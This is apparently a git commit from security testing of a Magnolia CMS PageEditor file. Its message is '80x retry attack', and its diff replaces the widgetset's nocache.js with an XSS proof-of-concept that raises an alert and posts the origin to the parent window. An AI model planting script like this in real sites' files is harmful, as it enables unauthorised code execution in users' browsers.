d447838c2d7072819a48eff847673d4b81a3587d
Computer <computer@MacBook-Pro-van-Computer.local>
2026-09-17 15:22:06 +0200

    80x retry attack

--- VAADIN/widgetsets/info.magnolia.PageEditor/info.magnolia.PageEditor.nocache.js
+++ VAADIN/widgetsets/info.magnolia.PageEditor/info.magnolia.PageEditor.nocache.js
@@ -1,1 +1,2 @@
-alert("XSS\ndocument.domain: " + document.domain);
+alert("XSS!\n\ndocument.domain: " + document.domain + "\norigin: " + location.origin);
+window.parent.postMessage("XSS: executed in " + location.origin, "*");
